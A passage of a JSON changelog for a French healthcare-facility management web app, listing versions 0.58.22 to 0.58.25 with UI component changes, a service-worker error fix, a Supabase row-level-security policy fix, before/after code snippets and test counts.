          "after": "// 0.58.25 - Timeline premium groupée par jour\nconst [viewMode, setViewMode] = useState('timeline');\n\n// Toggle UI Timeline / Tableau\n<button onClick={() => setViewMode('timeline')}>\n  <i className='ti ti-timeline-event' /> Timeline\n</button>\n<button onClick={() => setViewMode('table')}>\n  <i className='ti ti-table' /> Tableau\n</button>\n\n{viewMode === 'timeline' ? (\n  <HistoriqueTimeline rows={filteredRows} totalRows={rows.length} />\n) : (\n  /* tableau classique */\n)}\n\nfunction HistoriqueTimeline({ rows, totalRows }) {\n  // Groupe par jour ISO YYYY-MM-DD\n  const groupedByDay = {};\n  for (const r of rows) {\n    const key = new Date(r.created_at).toISOString().split('T')[0];\n    if (!groupedByDay[key]) groupedByDay[key] = [];\n    groupedByDay[key].push(r);\n  }\n\n  return (\n    <div>\n      {days.map(day => (\n        <div key={day}>\n          {/* Header jour avec pill noir */}\n          <div className='day-header'>\n            <i className='ti ti-calendar' />\n            {fmtDay(day)}  {/* 'Aujourd\\'hui' | 'Hier' | 'Lundi 3 juin' */}\n            <span>{groupedByDay[day].length} action(s)</span>\n          </div>\n\n          {/* Items du jour avec ligne verticale */}\n          <div style={{ paddingLeft: 32, borderLeft: '2px solid #e3e9ee' }}>\n            {groupedByDay[day].map((r, idx) => (\n              <div style={{ animation: `av-fade-in 0.4s ${idx * 0.04}s` }}>\n                {/* Pastille icône colorée */}\n                <div style={{\n                  position: 'absolute', left: -49, top: 2,\n                  background: `linear-gradient(135deg, ${actionColor}, ...)`,\n                  boxShadow: `0 0 0 3px #fff, 0 4px 12px ${actionColor}55`,\n                }}>\n                  <i className={`ti ${ACTION_ICON[r.action]}`} />\n                </div>\n\n                {/* Card event */}\n                <div style={{\n                  borderLeft: `3px solid ${actionColor}`,\n                  /* suppressions en rouge clair */\n                }}>\n                  <span>{ACTION_LBL[r.action]}</span>\n                  <Badge kind={r.entite}>{r.entite}</Badge>\n                  <span>{fmtTime(r.created_at)}</span>\n\n                  {/* Détails inline */}\n                  {r.details && <div>{r.details.numero} · ...</div>}\n\n                  {/* Avatar user avec initiales */}\n                  <div style={{ background: avatarColor(r.user_email) }}>\n                    {emailToInitials(r.user_email)}\n                  </div>\n                  {r.user_email}\n                </div>\n              </div>\n            ))}\n          </div>\n        </div>\n      ))}\n    </div>\n  );\n}"
        }
      },
      { "code": "AI", "txt": "+30 tests Vitest (v058-25-bundle-wow.test.js) : version+SW (2), Migration NeonButton 3 pages (3 — params navy + maintenance blue x4 + consentements dynamic), Cmd+K contextuel (7 — usePathname + pageContext regex + findActions trié + 3 nouvelles actions + handler #toggle), Mode focus zen (6 — lib 4 fonctions + localStorage + classList + shortcut Ctrl+Shift+F + CSS hide topbar + badge), ParticlesBackground variants (6 — mode prop + flowDirection + MULTICOLORS palette + init avec p.c + flow wrap + draw multicolor), Page historique timeline (8 — ACTION_ICON + viewMode state + toggle UI + composant + groupage par jour + helpers initials/avatarColor + animation stagger + EmptyState search). Total **~4032 verts** estimé (build/test à exécuter en local côté Cédric, sandbox bloqué par npm 403)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.25 : 5 chantiers WOW XL livrés. Migration NeonButton **20 boutons sur 10 pages** désormais (depuis 0.58.21). Cmd+K palette devient un vrai outil de productivité avec actions contextuelles intelligentes. Mode focus zen complète Mode présentation pour les workflows pro (saisie + démos). ParticlesBackground enrichi de 2 modes visuels pour effets WOW variés. /historique transformé d'un tableau triste en **timeline premium narrative**. ⚠ **À NOTER** : sandbox npm bloqué (403 sur @playwright/test, @supabase/ssr, @supabase/supabase-js) — build + tests à exécuter en local. PROCHAINES PISTES POSSIBLES (0.58.26) : (a) Driver.js onboarding tour produit (8-10 steps). (b) Dashboard widgets configurables drag & drop. (c) Toggle Mode Focus visible dans /profil (en plus du raccourci). (d) Application ParticlesBackground multicolor sur /accueil (mode 'cosmic'). (e) Notification badges premium avec preview au hover. (f) Skeleton premium dans les Tabs (transition entre onglets)" }
    ],
    "themes": ["ui", "wow", "design-system", "ux"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.25.html",
    "sqlFile": null
  },
  {
    "v": "0.58.24",
    "kind": "version",
    "titre": "🔧 BUG FIXES PROD : 504 SW silencé + 403 audit_log géré + EmptyState illustrations sur 6 pages + Toggle Mode Présentation",
    "chantiers": [
      { "code": "BUG", "txt": "🔧 FIX BUG PROD #1 : 504 Gateway Timeout SW silencé. Le SW ne retourne plus de `Response('', { status: 504 })` quand le réseau échoue — il **re-throw l'erreur native** (`throw e`). Conséquence : un seul message d'erreur dans la console (`Failed to load resource`) au lieu du combo bruyant `504 Gateway Timeout + FetchEvent network error`. Modification dans **cacheFirst** ET **networkFirst** dans public/sw.js. Next.js gère son retry automatique sur les chunks via son loader natif",
        "code_snippet": {
          "file": "public/sw.js",
          "note": "504 → throw natif",
          "lang": "javascript",
          "before": "// AVANT 0.58.24 - 504 explicite (bruyant dans console)\n// cacheFirst :\nreturn new Response('', {\n  status: 504,\n  statusText: 'Gateway Timeout',\n  headers: { 'Content-Type': 'text/plain' },\n});\n\n// networkFirst (idem)\nreturn new Response('', {\n  status: 504,\n  statusText: 'Gateway Timeout',\n  headers: { 'Content-Type': 'text/plain' },\n});",
          "after": "// 0.58.24 - throw natif (silencieux)\n// cacheFirst :\ntry { ... } catch (e) {\n  // ... fallback offline HTML ...\n  throw e;  // re-throw, browser logge naturellement\n}\n\n// networkFirst (idem)\ntry { ... } catch (e) {\n  // retry + cache fallback + HTML offline ...\n  throw e;  // re-throw au lieu de 504 explicite\n}"
        }
      },
      { "code": "BUG", "txt": "🔧 FIX BUG PROD #2 : 403 audit_log RLS géré côté code + SQL de fix. **Côté code (lib/events.js)** : try/catch silencieux qui détecte le 403 RLS (`error.code === '42501'` ou message contenant 'forbidden|policy|RLS'), affiche UNE SEULE FOIS un warning console diagnostic via `window._audit_log_warned_`. **Côté base (scripts/SQL-FIX-audit_log-rls-0.58.24.sql)** : drop des anciennes policies INSERT + create policy `audit_log_insert_v2` avec check `user_id = auth.uid()` AND `EXISTS membres_structures` pour l'appartenance à la structure. À exécuter dans Supabase SQL Editor",
        "code_snippet": {
          "file": "lib/events.js + scripts/SQL-FIX-audit_log-rls-0.58.24.sql",
          "note": "Silent 403 + SQL fix",
          "lang": "javascript",
          "before": "// AVANT 0.58.24 - try/catch mais Supabase JS log quand même\ntry {\n  await supabase.from('audit_log').insert({...});\n} catch (e) {\n  logger.warn('logEvent - audit échoué :', e);\n}",
          "after": "// 0.58.24 - silent 403 RLS avec diagnostic une seule fois\ntry {\n  const { error } = await supabase.from('audit_log').insert({...});\n  if (error) {\n    // Spécifiquement pour 403 RLS : log discret (warn) sans stack\n    if (error.code === '42501' || /forbidden|policy|RLS/i.test(error.message || '')) {\n      if (typeof window !== 'undefined' && !window._audit_log_warned_) {\n        window._audit_log_warned_ = true;\n        console.warn(\n          '[audit_log] RLS bloque les inserts. ' +\n          'Exécutez scripts/SQL-FIX-audit_log-rls-0.58.24.sql en base.'\n        );\n      }\n    } else {\n      logger.warn('logEvent - audit échoué :', error.message);\n    }\n  }\n} catch (e) {\n  logger.warn('logEvent - audit exception :', e?.message || e);\n}\n\n/* SQL FIX */\nDROP POLICY IF EXISTS 'audit_log_insert' ON audit_log;\nDROP POLICY IF EXISTS 'audit_log_insert_authenticated' ON audit_log;\n\nCREATE POLICY 'audit_log_insert_v2' ON audit_log\nFOR INSERT TO authenticated\nWITH CHECK (\n  user_id = auth.uid()\n  AND EXISTS (\n    SELECT 1 FROM membres_structures\n    WHERE membres_structures.user_id = auth.uid()\n      AND membres_structures.structure_id = audit_log.structure_id\n      AND (membres_structures.archive IS NULL OR membres_structures.archive = false)\n  )\n);\n\nALTER TABLE audit_log ENABLE ROW LEVEL SECURITY;"
        }
      },
      { "code": "UI", "txt": "🎨 APPLICATION EMPTYSTATE ILLUSTRATIONS SUR 6 PAGES (7 EmptyState modifiés). Les empty states qui utilisaient `icon='ti-...'` passent en `illustration='...'` avec les SVG animées livrées en 0.58.23 : (a) **/patients** : illustration=**users** (liste vide) + illustration=**search** (filtres). (b) **/interventions** : illustration=**clipboard**. (c) **/achats** : illustration=**folder** (liste vide) + illustration=**search** (filtres). (d) **/signalements** : illustration=**inbox** (liste vide) + illustration=**search** (filtres). (e) **/maintenance** : illustration=**chart** (liste vide) + illustration=**search** (filtres). (f) **/commandes** : illustration=**folder**. Total : 7 EmptyState modifiés sur 6 pages",
        "code_snippet": {
          "file": "app/patients/page.js + 5 autres pages",
          "note": "icon → illustration",
          "lang": "jsx",
          "before": "// AVANT 0.58.24 - icon Tabler simple\n<EmptyState\n  icon='ti-user-plus'\n  variant='teal'\n  title='Aucun patient pour le moment'\n  message='...'\n  actionLabel='Créer le premier patient'\n  onAction={openNew}\n/>",
          "after": "// 0.58.24 - illustration SVG animée\n<EmptyState\n  illustration='users'     // ← 6 dispo : inbox|search|folder|clipboard|chart|users\n  variant='teal'\n  title='Aucun patient pour le moment'\n  message='...'\n  actionLabel='Créer le premier patient'\n  onAction={openNew}\n/>\n\n// Mapping par page :\n// /patients     → users / search\n// /interventions → clipboard\n// /achats       → folder / search\n// /signalements → inbox / search\n// /maintenance  → chart / search\n// /commandes    → folder"
        }
      },
      { "code": "UI", "txt": "🎥 TOGGLE MODE PRÉSENTATION DANS /PROFIL (en plus du raccourci Ctrl+Shift+P). Nouveau panel violet 'Mode présentation' dans l'onglet Sécurité (après 'Ma session'). Composant **PresentationModeToggle** qui : (a) lit l'état initial via `isPresentationMode()` au mount. (b) Écoute l'event `av-presentation-mode-change` pour rester en sync avec le shortcut. (c) Bouton NeonButton qui bascule entre variant=**violet** icon=ti-presentation (off) et variant=**amber** icon=ti-presentation-analytics (on). (d) Mention du raccourci Ctrl+Shift+P / Cmd+Shift+P en bas du panel",
        "code_snippet": {
          "file": "app/profil/page.js",
          "note": "Toggle UI + sync",
          "lang": "jsx",
          "before": "// AVANT 0.58.24 - Mode présentation uniquement via raccourci clavier",
          "after": "// 0.58.24 - Toggle visible dans /profil\nimport { isPresentationMode, togglePresentationMode } from '../../lib/presentationMode';\n\nfunction PresentationModeToggle() {\n  const [isOn, setIsOn] = useState(false);\n  useEffect(() => {\n    setIsOn(isPresentationMode());\n    // Sync avec le shortcut Ctrl+Shift+P qui dispatch cet event\n    function onChange(e) { setIsOn(e?.detail?.on ?? isPresentationMode()); }\n    window.addEventListener('av-presentation-mode-change', onChange);\n    return () => window.removeEventListener('av-presentation-mode-change', onChange);\n  }, []);\n\n  return (\n    <NeonButton\n      variant={isOn ? 'amber' : 'violet'}\n      icon={isOn ? 'ti-presentation-analytics' : 'ti-presentation'}\n      onClick={() => setIsOn(togglePresentationMode())}\n    >\n      {isOn ? 'Désactiver le mode présentation' : 'Activer le mode présentation'}\n    </NeonButton>\n  );\n}\n\n// Dans /profil onglet Sécurité, après 'Ma session' :\n<Panel style={{ borderLeft: '4px solid #7a6fb0' }}>\n  <h2>🎥 Mode présentation</h2>\n  <p>Active le mode démo : zoom léger, animations slow, ombres renforcées</p>\n  <PresentationModeToggle />\n  <p>💡 Raccourci : <kbd>Ctrl+Shift+P</kbd></p>\n</Panel>"
        }
      },
      { "code": "AI", "txt": "+18 tests Vitest (v058-24-fixes-prod.test.js) + 2 ajustements anciens : version+SW (2), Fix SW 504 → throw natif (2), Fix audit_log 403 silent (3 — code 42501 + warning unique + SQL file), EmptyState illustrations 6 pages (6 — chaque page vérifiée), Toggle Mode Présentation profil (5 — imports + composant + state + event listener + NeonButton + mention Ctrl+Shift+P). Ajustements : v058-18-hotfix-prod (504 → throw natif accepté), v058-2-hotfix-audit-403 (3 options acceptées : Response.error|504|throw). Total **4002 verts** (+18 nets)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.24 : focus sur la qualité prod. Les 2 bugs prod récurrents (504 SW + 403 audit_log) sont désormais traités : SW silencieux + audit_log géré avec SQL de fix livré. **ACTION REQUISE EN BASE** : exécuter `scripts/SQL-FIX-audit_log-rls-0.58.24.sql` dans le SQL Editor Supabase pour résoudre définitivement les 403. Le code continue à fonctionner sans (les inserts audit_log échouent silencieusement). EmptyState illustrations appliquées partout pour une expérience visuelle premium constante. Toggle Mode Présentation accessible aux non-techniques (pas besoin de connaître le raccourci clavier). PROCHAINES PISTES : (a) Driver.js onboarding tour produit. (b) Migration NeonButton sur les modales restantes (/parametres, /maintenance, /consentements). (c) Cmd+K actions contextuelles. (d) Dashboard widgets configurables. (e) Stack viewer pour les events audit_log (page /historique premium)" }
    ],
    "themes": ["bugfix", "ui", "ux", "prod"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.24.html",
    "sqlFile": "aveho-PATCH-vers-0.58.24.sql"
  },
  {
    "v": "0.58.23",
    "kind": "version",
    "titre": "🚀 MEGA BUNDLE WOW : NeonButton 2 pages + ConicCard signalements/RGPD + PageHero particles 4 pages + EmptyState 6 SVG + BulkToolbar progress + Cmd+K actions + MODE PRÉSENTATION",
    "chantiers": [
      { "code": "UI", "txt": "🔄 MIGRATION NEONBUTTON sur /patients et /utilisateurs. (a) **/patients** : 'Nouveau patient' → NeonButton variant=teal icon=ti-plus + 'Enregistrer' (modal save) → NeonButton variant=teal icon=ti-device-floppy + spinner busy. (b) **/utilisateurs** : 'Nouveau rôle' → NeonButton variant=violet icon=ti-plus + 'Créer un utilisateur' → NeonButton variant=teal icon=ti-user-plus + 'Enregistrer (rôle)' → NeonButton variant=violet icon=ti-device-floppy. Total **5 nouveaux NeonButton** sur 2 pages. Pages /materiel /commandes /stock ne contenaient pas de boutons d'action (read-only)" },
      { "code": "UI", "txt": "💫 CONICCARD SUR /accueil pour 2 KPIs CRITIQUES supplémentaires. (a) **'Signalements'** en variant=**terra** speed=**fast** (scan rapide 2s — visuel urgent). (b) **'RGPD à renouveler'** en variant=**violet** speed=normal. Avec les 'DI à traiter' (aurora) et 'Achats à valider' (amber) livrés en 0.58.22, le /accueil a maintenant **4 KPIs en ConicCard** quand ils sont >0 — vraie expérience 'mission control'. Les KPIs apparaissent uniquement si la valeur est >0 (sinon cachés)",
        "code_snippet": {
          "file": "app/accueil/HeroDashboard.js",
          "note": "4 ConicCard sur /accueil",
          "lang": "jsx",
          "before": "// AVANT 0.58.23 - signalements et RGPD en KpiCard standard\n{atraiter.signalements > 0 && (\n  <KpiCard\n    label='Signalements' value={atraiter.signalements}\n    icon='ti-alert-triangle' variant='terra'\n    onClick={() => go('/signalements')}\n  />\n)}\n{atraiter.renouv > 0 && (\n  <KpiCard\n    label='RGPD à renouveler' value={atraiter.renouv}\n    icon='ti-shield-check' variant='violet'\n    onClick={() => go('/statistiques-rgpd')}\n  />\n)}",
          "after": "// 0.58.23 - ConicCard pour visuel urgent permanent\n{atraiter.signalements > 0 && (\n  <ConicCard\n    label='Signalements' value={atraiter.signalements}\n    icon='ti-alert-triangle' variant='terra'\n    speed='fast'                  // 2s scan rapide = urgence\n    onClick={() => go('/signalements')}\n  />\n)}\n{atraiter.renouv > 0 && (\n  <ConicCard\n    label='RGPD à renouveler' value={atraiter.renouv}\n    icon='ti-shield-check' variant='violet'\n    speed='normal'                // 4s scan\n    onClick={() => go('/statistiques-rgpd')}\n  />\n)}\n\n// Au total sur /accueil :\n// - DI à traiter (aurora, normal)        — 0.58.22\n// - Achats à valider (amber, normal)     — 0.58.22\n// - Signalements (terra, FAST)           — 0.58.23\n// - RGPD à renouveler (violet, normal)   — 0.58.23"
        }
      },
      { "code": "UI", "txt": "✨ PAGEHERO PARTICLES ACTIVÉ SUR 4 PAGES CLÉS. Les particules canvas variant-aware (livrées en 0.58.22) sont maintenant activées en background des PageHero de : (a) **/statistiques** variant=blue particlesCount=25 (effet 'data viz'). (b) **/calendrier** variant=violet particlesCount=20. (c) **/parametres** variant=navy particlesCount=20 (effet 'config tech'). (d) **/interventions/kanban** variant=terra particlesCount=20. Particules skip mobile par défaut (économie batterie)" },
      { "code": "UI", "txt": "🎨 EMPTYSTATE PREMIUM : 6 ILLUSTRATIONS SVG ANIMÉES. Nouvelle prop **`illustration`** qui remplace l'icône simple par une illustration SVG riche et animée. 6 illustrations dispo : (a) **`inbox`** : boîte de réception avec papiers volants (3 docs qui flottent). (b) **`search`** : loupe avec particules pulse autour + radial gradient. (c) **`folder`** : dossier avec 3 dots pulse (représentent les fichiers). (d) **`clipboard`** : presse-papier avec lignes shimmer + bullets. (e) **`chart`** : graphique avec 3 barres rise-up + courbe line + dots. (f) **`users`** : 3 silhouettes (centre + 2 latérales qui flottent). Drop-shadow glow filter selon variant. Compat 100% : ancien usage `icon` toujours fonctionnel",
        "code_snippet": {
          "file": "app/components/ui-premium/EmptyState.js",
          "note": "6 illustrations SVG animées",
          "lang": "jsx",
          "before": "// AVANT 0.58.23 - juste icon Tabler\n<EmptyState\n  icon='ti-tools'\n  variant='teal'\n  title='Aucune intervention'\n  message='Pas encore de DI en cours'\n  actionLabel='Créer une intervention'\n  onAction={openNew}\n/>",
          "after": "// 0.58.23 - illustration SVG animée\n<EmptyState\n  illustration='inbox'    // NEW : inbox | search | folder | clipboard | chart | users\n  variant='teal'\n  title='Aucune intervention'\n  message='Pas encore de DI en cours'\n  actionLabel='Créer une intervention'\n  onAction={openNew}\n/>\n\n// Les 6 illustrations dispo :\n<EmptyState illustration='inbox' />     {/* boîte + papiers volants */}\n<EmptyState illustration='search' />    {/* loupe + particules pulse */}\n<EmptyState illustration='folder' />    {/* dossier + dots pulse */}\n<EmptyState illustration='clipboard' /> {/* presse-papier + shimmer */}\n<EmptyState illustration='chart' />     {/* graphique animé */}\n<EmptyState illustration='users' />     {/* 3 silhouettes flottantes */}"
        }
      },
      { "code": "UI", "txt": "📊 BULKTOOLBAR PROGRESS BAR. Nouvelle prop **`progress={{current, total, label}}`** qui affiche une barre de progression intégrée dans le BulkToolbar pour les opérations bulk en cours (export, archive, suppression…). Gradient teal→blue avec shimmer animation 1.6s + label + compteur `{current}/{total}` en tabular-nums. Affichée uniquement si progress.total > 0",
        "code_snippet": {
          "file": "app/components/ui-premium/BulkToolbar.js",
          "note": "Progress bar intégrée",
          "lang": "jsx",
          "before": "// AVANT 0.58.23 - pas de progress\n<BulkToolbar\n  count={selected.size}\n  onClear={clear}\n  actions={[...]}\n/>",
          "after": "// 0.58.23 - progress bar intégrée pour ops bulk\nconst [bulkProgress, setBulkProgress] = useState(null);\n\nasync function bulkExport() {\n  const total = selected.size;\n  let current = 0;\n  for (const id of selected) {\n    setBulkProgress({ current, total, label: 'Export en cours...' });\n    await exportItem(id);\n    current++;\n  }\n  setBulkProgress(null);\n}\n\n<BulkToolbar\n  count={selected.size}\n  onClear={clear}\n  actions={[...]}\n  progress={bulkProgress}    // NEW\n/>\n\n// La barre :\n// - Gradient teal→blue\n// - Shimmer overlay (effet 'travail en cours')\n// - Label custom + compteur current/total"
        }
      },
      { "code": "UI", "txt": "⚡ COMMAND PALETTE : ACTIONS GLOBALES (créer patient, intervention…). Refonte de GlobalSearch.js : (a) Nouvelle constante **ACTIONS** avec 12 actions globales : `new-patient`, `new-intervention`, `new-signalement`, `new-achat`, `new-transfert`, `goto-accueil`, `goto-stats`, `goto-calendrier`, `goto-kanban`, `goto-profil`, `goto-params`, `clear-cache`. Chaque action a : id, lbl, icon, color, url, keywords[]. (b) Helper **`findActions(query)`** : retourne les actions matching par keyword (recherche fuzzy) ou si query commence par **`>`** (mode commande explicite). (c) Section **'Actions rapides'** rendue en haut de la palette (avant les résultats classiques) avec icon ti-bolt + items stylisés avec gradient colored + hover translateX. (d) Astuce **`>`** affichée dans la zone d'accueil de la palette",
        "code_snippet": {
          "file": "app/GlobalSearch.js",
          "note": "Actions globales Cmd+K",
          "lang": "jsx",
          "before": "// AVANT 0.58.23 - palette de recherche seule",
          "after": "// 0.58.23 - Actions globales dans la palette\nconst ACTIONS = [\n  { id: 'new-patient', lbl: 'Créer un patient', icon: 'ti-user-plus',\n    color: '#185FA5', url: '/patients?new=1',\n    keywords: ['créer', 'patient', 'nouveau', 'ajouter'] },\n  { id: 'new-intervention', lbl: 'Créer une intervention', ... },\n  { id: 'new-signalement', lbl: 'Déposer un signalement', ... },\n  // ... 12 actions au total\n  { id: 'clear-cache', lbl: 'Vider le cache (problème d\\'affichage)',\n    icon: 'ti-refresh', color: '#EF9F27',\n    url: '/profil?tab=securite',\n    keywords: ['cache', 'vider', 'refresh', 'bug'] },\n];\n\nfunction findActions(query) {\n  const q = query.toLowerCase().trim();\n  const isExplicitCommand = q.startsWith('>');\n  const cleanQ = isExplicitCommand ? q.slice(1).trim() : q;\n  return ACTIONS.filter(a =>\n    a.lbl.toLowerCase().includes(cleanQ) ||\n    a.keywords.some(k => k.includes(cleanQ) || cleanQ.includes(k))\n  ).slice(0, 6);\n}\n\n// Usage UI :\nCmd+K → tape 'pat' → 'Créer un patient' apparaît en haut\nCmd+K → tape '>' → toutes les actions disponibles\nCmd+K → tape 'cache' → 'Vider le cache' apparaît"
        }
      },
      { "code": "UI", "txt": "🎥 MODE PRÉSENTATION pour démos clients. (a) Nouveau module **lib/presentationMode.js** avec 5 fonctions : `isPresentationMode()`, `setPresentationMode(on)`, `togglePresentationMode()`, `initPresentationMode()`. State persisté dans localStorage `av-presentation-mode`. (b) Composant **PresentationModeBoot** dans layout.js : auto-init au reload + écoute **Ctrl+Shift+P** (ou Cmd+Shift+P) pour toggle. (c) Toast info au toggle. (d) CSS quand classe `av-presentation-mode` sur <html> : font-size 17.5px (zoom léger), animation-duration *= 1.5s sur tout, ombres renforcées sur panels/KPIs, hide debug badges, **badge fixé 'MODE PRÉSENTATION'** en bas avec animation pulse",
        "code_snippet": {
          "file": "lib/presentationMode.js + app/PresentationModeBoot.js + globals.css",
          "note": "Mode démo clients",
          "lang": "jsx",
          "before": "// AVANT 0.58.23 - pas de mode démo",
          "after": "// 0.58.23 - Mode présentation\n// lib/presentationMode.js\nexport function togglePresentationMode() {\n  const next = !isPresentationMode();\n  setPresentationMode(next);\n  return next;\n}\n\nfunction applyMode(on) {\n  const html = document.documentElement;\n  if (on) html.classList.add('av-presentation-mode');\n  else html.classList.remove('av-presentation-mode');\n}\n\n// app/PresentationModeBoot.js (dans layout)\nfunction onKey(e) {\n  if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'P' || e.key === 'p')) {\n    e.preventDefault();\n    const next = togglePresentationMode();\n    toast.info('🎥 Mode présentation activé', '...');\n  }\n}\n\n/* CSS */\nhtml.av-presentation-mode {\n  font-size: 17.5px;  /* zoom léger */\n}\nhtml.av-presentation-mode * {\n  animation-duration: 1.5s !important;  /* slow */\n}\nhtml.av-presentation-mode .panel {\n  box-shadow: 0 12px 32px rgba(20,33,49,.18),\n              0 0 24px rgba(124,200,200,.12) !important;\n}\n/* Badge MODE PRÉSENTATION en bas */\nhtml.av-presentation-mode::after {\n  content: '🎥 MODE PRÉSENTATION';\n  position: fixed; bottom: 14px; left: 50%;\n  transform: translateX(-50%);\n  background: linear-gradient(135deg, #EF9F27, #d6831d);\n  color: #fff; padding: 8px 20px;\n  border-radius: 99px;\n  font-weight: 800; letter-spacing: 2px;\n  animation: av-presentation-badge-pulse 2.5s ease-in-out infinite;\n}"
        }
      },
      { "code": "AI", "txt": "+31 tests Vitest (v058-23-mega-wow.test.js) : version+SW (2), Migration NeonButton patients+utilisateurs (2 — imports + 5 boutons), ConicCard signalements+RGPD (2), PageHero particles 4 pages (4 — statistiques + calendrier + parametres + kanban), EmptyState 6 illustrations (5 — objet ILLUSTRATIONS 6 entrées + props illustration + drop-shadow + variant violet + 4 keyframes), BulkToolbar progress (5 — prop null + render conditionnel + gradient teal→blue + tabular-nums + keyframe shimmer), Command palette ACTIONS (4 — 12 actions + findActions + section render + tip >), Mode présentation (7 — lib 4 exports + localStorage key + classList + Ctrl+Shift+P + layout import + CSS font-size + badge pulse). Total 3984 verts (+31 nets)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.23 : 7 chantiers WOW livrés en méga-bundle. Migration NeonButton continue (cumul depuis 0.58.21 : 11 boutons sur 6 pages). 4 KPIs sur /accueil en ConicCard quand >0. ParticlesBackground actif sur 4 PageHero. EmptyState premium avec 6 illustrations SVG riches. BulkToolbar peut désormais afficher la progression d'opérations bulk. Cmd+K palette enrichie de 12 actions globales (mode commande > pour les power users). Mode présentation pour les démos clients avec shortcut Ctrl+Shift+P. PROCHAINES PISTES POSSIBLES : (a) Application des EmptyState premium sur les pages /patients (illustration users), /interventions (clipboard), /achats (folder), /stock (chart). (b) Driver.js intégration onboarding tour pour nouveaux utilisateurs. (c) Migration NeonButton sur les modales restantes (/parametres, /maintenance, /consentements). (d) Cmd+K actions contextuelles (selon la page courante). (e) Mode 'focus' (cache notifs + toolbars pour saisie zen). (f) Dashboard widgets configurables (drag & drop)" }
    ],
    "themes": ["ui", "wow", "design-system", "ux", "demo"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.23.html",
    "sqlFile": null
  },
  {
    "v": "0.58.22",
    "kind": "version",
    "titre": "✨ BUNDLE WOW : ConicCard /accueil + NeonButton 4 pages + PageHero particles + Toast stack + Page transitions + Drawer Skeleton",
    "chantiers": [
      { "code": "UI", "txt": "💫 CONICCARD APPLIQUÉ SUR /ACCUEIL — les 2 KPIs phares 'DI à traiter' et 'Achats à valider' passent en ConicCard (au lieu de KpiCard classique). (a) **'DI à traiter'** en variant=**aurora** : bordure conic-gradient multi-couleur Aveho (teal→blue→violet→terra) qui tourne en permanence. Effet wow immédiat car attire l'œil même sans hover. Speed normal (4s). (b) **'Achats à valider'** en variant=**amber** : scan-line conic amber permanent. Tous deux conservent l'onClick navigation existant. Mode 'spotlight' qui distingue visuellement les KPIs importants des KpiCards classiques",
        "code_snippet": {
          "file": "app/accueil/HeroDashboard.js",
          "note": "ConicCard sur les 2 KPIs phares",
          "lang": "jsx",
          "before": "// AVANT 0.58.22\n{atraiter.di > 0 && (\n  <KpiCard\n    label='DI à traiter'\n    value={atraiter.di}\n    icon='ti-tools'\n    variant='terra'\n    onClick={() => go('/interventions/kanban')}\n  />\n)}\n{atraiter.achats > 0 && (\n  <KpiCard\n    label='Achats à valider'\n    value={atraiter.achats}\n    icon='ti-shopping-cart'\n    variant='amber'\n    onClick={() => go('/achats')}\n  />\n)}",
          "after": "// 0.58.22 - ConicCard pour spotlight permanent\nimport { ConicCard } from '../components/ui-premium';\n\n{atraiter.di > 0 && (\n  <ConicCard\n    label='DI à traiter'\n    value={atraiter.di}\n    icon='ti-tools'\n    variant='aurora'        // multi-couleur Aveho\n    speed='normal'          // 4s scan\n    onClick={() => go('/interventions/kanban')}\n  />\n)}\n{atraiter.achats > 0 && (\n  <ConicCard\n    label='Achats à valider'\n    value={atraiter.achats}\n    icon='ti-shopping-cart'\n    variant='amber'\n    speed='normal'\n    onClick={() => go('/achats')}\n  />\n)}"
        }
      },
      { "code": "UI", "txt": "🔄 MIGRATION NEONBUTTON SUR 4 PAGES CLÉS. (a) **/interventions** : bouton 'Envoyer la demande' (modal new DI) → NeonButton variant=blue icon=ti-send + spinner ti-loader-2 en busy. (b) **/achats** : 'Nouvelle demande d'achat' → NeonButton variant=amber icon=ti-plus. (c) **/transferts** : 'Nouveau transfert' → NeonButton variant=violet icon=ti-plus + 'Créer le transfert' (modal) → NeonButton variant=violet icon=ti-arrows-exchange + spinner. (d) **/signalements** : 'Nouveau signalement' → NeonButton variant=teal icon=ti-plus + 'Déposer/Enregistrer' (modal) → NeonButton variant=teal icon ti-send/ti-device-floppy. Au total **6 nouveaux NeonButton** sur les pages d'action principales",
        "code_snippet": {
          "file": "app/interventions/page.js + achats + transferts + signalements",
          "note": "6 NeonButton sur 4 pages",
          "lang": "jsx",
          "before": "// AVANT 0.58.22\n<Btn variant='new' icon='ti-plus' onClick={openNew}>\n  Nouvelle demande d'achat\n</Btn>\n\n<button className='btn-save' onClick={save} disabled={busy}>\n  {busy ? '…' : 'Envoyer la demande'}\n</button>\n\n<button className='btn-new' onClick={openNew}>\n  <i className='ti ti-plus' /> Nouveau transfert\n</button>",
          "after": "// 0.58.22 - NeonButton premium\nimport { NeonButton } from '../components/ui-premium';\n\n{/* /achats */}\n<NeonButton variant='amber' icon='ti-plus' onClick={openNew}>\n  Nouvelle demande d'achat\n</NeonButton>\n\n{/* /interventions */}\n<NeonButton variant='blue' icon={busy ? 'ti-loader-2' : 'ti-send'} onClick={save} disabled={busy}>\n  {busy ? 'Envoi en cours…' : 'Envoyer la demande'}\n</NeonButton>\n\n{/* /transferts */}\n<NeonButton variant='violet' icon='ti-plus' onClick={openNew}>\n  Nouveau transfert\n</NeonButton>\n\n{/* /signalements */}\n<NeonButton variant='teal' icon='ti-plus' onClick={openNew}>\n  Nouveau signalement\n</NeonButton>"
        }
      },
      { "code": "UI", "txt": "✨ PAGEHERO : prop particles + variants couleur déduits. (a) Nouvelles props **`particles`** (false par défaut) + **`particlesCount`** (20). (b) Quand activé, **ParticlesBackground rendu en absolute** derrière le contenu hero. (c) **Couleur des particules déduite du variant** (teal/blue/violet/terra/amber) via nouvelle clé `particleColor` dans chaque variant. (d) Skip mobile par défaut (économie batterie). (e) Usage : `<PageHero variant='violet' particles title='Statistiques' />`",
        "code_snippet": {
          "file": "app/components/ui-premium/PageHero.js",
          "note": "Particules variant-aware",
          "lang": "jsx",
          "before": "// AVANT 0.58.22 - VARIANTS sans particleColor\nconst VARIANTS = {\n  teal: { grad: '...', accent: '#7CC8C8' },\n  violet: { grad: '...', accent: '#bfb5dd' },\n  // ...\n};\n\nexport default function PageHero({ ... }) {\n  // Pas de particules\n}",
